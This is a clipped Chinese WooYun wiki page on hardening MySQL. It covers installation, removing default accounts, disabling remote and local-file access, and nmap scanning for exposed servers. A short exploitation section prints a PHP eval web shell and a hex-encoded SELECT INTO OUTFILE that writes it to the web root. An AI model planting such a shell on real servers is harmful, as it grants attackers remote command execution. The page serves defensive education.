@@ -1,0 +1,226 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.8 (453748)"/><meta name="created" content="2016-10-19 12:37:57 +0000"/><meta name="source" content="web.clip"/><meta name="source-url" content="http://wiki.wooyun.org/server:mysql"/><meta name="updated" content="2016-10-19 12:37:57 +0000"/><title>server:mysql [WooYun WiKi]</title></head><body><div style="-evernote-webclip:true"><br/><div style="font-size: 16px"><div style="box-sizing:border-box;font-family:sans-serif;text-size-adjust:100%;font-size:10px;-webkit-tap-highlight-color:rgba(0, 0, 0, 0);"><div style="box-sizing:border-box;font-family:&quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:small;line-height:1.42857;color:rgb(51, 51, 51);background:rgb(253, 253, 253);"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;"><span style="box-sizing:border-box;"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;"><div style="box-sizing:border-box;"><span style="display:table;"/>
+
+                                          
+              <div style="box-sizing:border-box;position:fixed;float:right;z-index:1024;top:10px;right:10px;">
+                
+<div style="float:right;box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;border-color:rgb(221, 221, 221);border:1px solid transparent;margin:0px 0px 1.4em 1.4em;width:auto;color:inherit;font-size:0.95em;margin-left:20px;">
+<h3 style="border-bottom:1px solid transparent;box-sizing:border-box;border-top-left-radius:3px;font-weight:bold;color:rgb(51, 51, 51);border-color:rgb(221, 221, 221);background-color:rgb(245, 245, 245);font-family:inherit;line-height:1.1;border-top-right-radius:3px;padding:5px;font-size:0.95em;margin:0px;cursor:pointer;"><i style="box-sizing:border-box;position:relative;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;padding-right:5px;"><span style="font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;"></span></i> <strong style="line-height:1;font-weight:400;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;position:relative;-webkit-font-smoothing:antialiased;box-sizing:border-box;float:right;margin:0px 0.2em;padding-right:5px;"><span style="font-weight:400;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;line-height:1;"></span></strong></h3>
+
+</div>
+
+              </div>
+
+              
+              
+<h1 style="box-sizing:border-box;font-size:36px;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin:40px 0px 20px;padding-bottom:9px;border-bottom:1px solid rgb(238, 238, 238);margin-top:10px;">MySQL安全配置</h1>
+<div style="box-sizing:border-box;"
+
+/>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">1、MySQL简介</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+MySQL原本是一个开放源代码的关系数据库管理系统，原开发者为瑞典的MySQL AB公司，该公司于2008年被昇阳微系统（Sun Microsystems）收购。2009年，甲骨文公司（Oracle）收购昇阳微系统公司，MySQL成为Oracle旗下产品。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+MySQL在过去由于性能高、成本低、可靠性好，已经成为最流行的开源数据库，因此被广泛地应用在Internet上的中小型网站中。随着MySQL的不断成熟，它也逐渐用于更多大规模网站和应用，比如维基百科、Google和Facebook等网站。非常流行的开源软件组合LAMP中的“M”指的就是MySQL。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+但被甲骨文公司收购后，Oracle大幅调涨MySQL商业版的售价，且甲骨文公司不再支持另一个自由软件项目OpenSolaris的发展，因此导致自由软件社区们对于Oracle是否还会持续支持MySQL社区版（MySQL之中唯一的免费版本）有所隐忧，因此原先一些使用MySQL的开源软件逐渐转向其它的数据库。例如维基百科已于2013年正式宣布将从MySQL迁移到MariaDB数据库。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">2、MySQL服务器架设</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">Mysql安装</strong>
+从<a href="https://web.archive.org/web/20160307185128/http://www.mysql.com/downloads/" title="http://www.mysql.com/downloads/" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">mysql官方下载地址</a>中下载最新的release包。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">tar</span> zxf mysql.tar.gz <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>编译源码
+ 
+为mysql的运行建立mysql用户和mysql用户组
+groupadd mysql 
+useradd <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-g</span> mysql mysql
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>进行mysql安装
+ .<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>configure <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--prefix</span>=<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>usr<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>local<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>mysql
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">make</span>
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">make</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">install</span>
+ 
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">cp</span> support-files<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>my-medium.cnf <span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>etc<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>my.cf <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>复制配置示例文件为配置文件
+mysql_install_db <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--user</span>=mysql <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>用mysql生成初始数据库，出现类似thank <span style="box-sizing:border-box;color:rgb(177, 177, 0);">for</span> using mysql 证明初始化数据库成功。
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>用户目录权限限制
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">chown</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-R</span> root <span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>  <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>修改mysql目录有者为root
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">chown</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-R</span> mysql <span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>var <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>修改var目录所有者为mysql
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">chgrp</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-R</span> mysql <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>修改当前目录所属组为mysql
+bin<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>mysqld_safe <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--user</span>=mysql <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&amp;</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>启动mysql
+bin<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>mysql –u root <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>连接mysql
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>修改root密码，此处示例将密码改成了<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"password"</span>
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> use mysql;
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> update user <span style="box-sizing:border-box;color:rgb(177, 177, 0);">set</span> <span style="box-sizing:border-box;color:rgb(153, 51, 51);">password</span>=password<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'password'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> where <span style="box-sizing:border-box;color:rgb(153, 51, 51);">user</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">'root'</span>;
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> flush privileges; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>强制刷新内存授权表，否则用的还是在内存缓冲的口令
+ 
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>也可以使用 mysqladmin进行修改
+mysqladmin <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-u</span> root password <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"upassword"</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>使用mysqladmin
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>删除默认数据库和数据库用户
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> show databases; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>显示所有数据库
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> drop database <span style="box-sizing:border-box;color:rgb(0, 0, 102);">test</span>; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>删除默认数据库<span style="box-sizing:border-box;color:rgb(0, 0, 102);">test</span>
+use mysql; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>进入mysql数据库
+delete from db; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>删除存放数据库的表信息，因为还没有数据库信息。
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> delete from user where not <span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">user</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">'root'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> ; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span> 删除初始非root的用户
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> delete from user where <span style="box-sizing:border-box;color:rgb(153, 51, 51);">user</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">'root'</span> and <span style="box-sizing:border-box;color:rgb(153, 51, 51);">password</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">''</span>; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>删除空密码的root
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> flush privileges; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>强制刷新内存授权表。
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>修改默认管理员账户
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> update user <span style="box-sizing:border-box;color:rgb(177, 177, 0);">set</span> <span style="box-sizing:border-box;color:rgb(153, 51, 51);">user</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"newroot"</span> where <span style="box-sizing:border-box;color:rgb(153, 51, 51);">user</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"root"</span>; <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>将默认管理员root改成newroot
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> flush privileges;
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>使用mysql用户启动mysql
+mysqld_safe <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--user</span>=mysql <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&amp;</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>启动时指定用mysql用户启动<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>每次启动都要设置用mysql用户启动<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>对my.cnf中的mysqld进行设置，如下：
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span>mysqld<span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span>
+<span style="box-sizing:border-box;color:rgb(153, 51, 51);">user</span>=mysql
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>禁止远程连接数据库
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>在my.cf中将<span style="box-sizing:border-box;color:rgb(102, 102, 102);font-style:italic;">#skip-networking的注释去掉</span>
+mysqladmin <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-u</span> root <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-p</span> shutdown <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>停止数据库
+mysqld_safe <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--user</span>=mysql <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&amp;</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>用mysql用户启动mysql
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>删除命令历史记录，建议在修改用户密码之后都要进行一次
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">rm</span> .bash_history .mysql_history  <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>删除历史记录
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">ln</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-s</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>dev<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>null .bash_history   <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>将shell记录文件置空
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">ln</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-s</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>dev<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>null .mysql_history  <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>将mysql记录文件置空
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>禁止MySQL对本地文件存取
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>在my.cnf中添加local-infile=<span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span>,或者在启动mysql时加参数local-infile=<span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span>
+mysqld_safe <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--user</span>=mysql <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--local-infile</span>=<span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&amp;</span>
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>管理用户权限
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span>show grant <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>显示授权
+mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span>revoke delete on <span style="box-sizing:border-box;color:rgb(102, 204, 102);">*</span>.<span style="box-sizing:border-box;color:rgb(102, 204, 102);">*</span> from <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'root'</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>移除root用户的delete权限</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+Mysql的用户权限设置可参考<a href="https://web.archive.org/web/20160307185128/http://drops.wooyun.org/tips/2245" title="http://drops.wooyun.org/tips/2245" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">Mysql安全配置</a>根据实际需要给予所需的最低权限。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">3、错误配置及利用</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+Mysql配置导致的漏洞往往都是多个因素共同造成的，最常见的就是网站中存在phpmyadmin等数据库管理工具或者Mysql允许远程连接，加上Mysql没有修改掉默认的用户或者使用了弱口令。这导致了攻击者使用其得到的用户权限进行数据库操作。若在配置Mysql时对用户权限进行了限制，则可大大减少因此遭受的损失。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+在攻击者获取到Mysql数据库操作权限后，若服务器没有禁止MySQL对本地文件存取，那么攻击者可以通过写入shell，最终完全控制服务器。示例是将
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">&lt;?php</span> <a href="https://web.archive.org/web/20160307185128/http://www.php.net/eval" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;"><span style="box-sizing:border-box;color:rgb(0, 0, 102);">eval</span></a><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(0, 0, 255);">$_REQUEST</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span>cmd<span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span><span style="box-sizing:border-box;color:rgb(51, 153, 51);">?&gt;</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+写入到/www/shell.php文件中。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> <span style="box-sizing:border-box;color:rgb(177, 177, 0);">select</span> 0x3c3f706870206576616c28245f524551554553545b636d645d293b3f3e  into outfile <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'/www/shell.php'</span></pre>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">4、实际案例</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307185128/http://www.wooyun.org/bugs/wooyun-2010-0101070" title="http://www.wooyun.org/bugs/wooyun-2010-0101070" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">多玩某站MYSQL弱口令</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307185128/http://www.wooyun.org/bugs/wooyun-2010-0102165" title="http://www.wooyun.org/bugs/wooyun-2010-0102165" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">暴走漫画某数据泄露可导致大量用户信息泄露</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307185128/http://www.wooyun.org/bugs/wooyun-2010-0106104" title="http://www.wooyun.org/bugs/wooyun-2010-0106104" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">某高校分站敏感信息泄露，且存在mysql弱口令</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307185128/http://www.wooyun.org/bugs/wooyun-2010-042097" title="http://www.wooyun.org/bugs/wooyun-2010-042097" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">自动化枚举系列#1 UC某服务弱口令导致可内网渗透</a>
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">5、修复方案</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+及时更新Mysql到最新版本，可在<a href="https://web.archive.org/web/20160307185128/http://www.mysql.com/downloads/" title="http://www.mysql.com/downloads/" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">mysql官方下载地址</a>找到下载地址。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若Mysql配置中存在问题可参考本条目<strong style="box-sizing:border-box;font-weight:700;">Mysql服务器架设</strong>。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">6、漏洞扫描及发现</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+Mysql默认端口为3306，当数据库允许远程连接时该端口会对外开放。
+通过对3306端口进行扫描就可以找到对外开放的Mysql服务器。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>扫描
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">nmap</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-n</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--open</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-p</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">3306</span> X.X.X.X<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span><span style="box-sizing:border-box;color:rgb(204, 102, 204);">24</span>
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>使用root用户和空口令连接Mysql服务器
+mysql <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-h</span> X.X.X.X <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-u</span> root</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+通过nmap扫描mysql相关的漏洞
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>检测mysql空口令
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">nmap</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-p3306</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--script</span>=mysql-empty-password.nse 192.168.5.1
+ 
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>检测<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">nmap</span>中支持扫描的所有MYSQL漏洞
+<span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">nmap</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-p3306</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--script</span>=mysql<span style="box-sizing:border-box;color:rgb(102, 204, 102);">*</span> 192.168.5.1</pre>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">7、相关资源</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307185128/http://www.mysql.com/" title="http://www.mysql.com/" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">mysql官方网站</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307185128/http://www.mysql.com/downloads/" title="http://www.mysql.com/downloads/" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">mysql官方下载地址</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
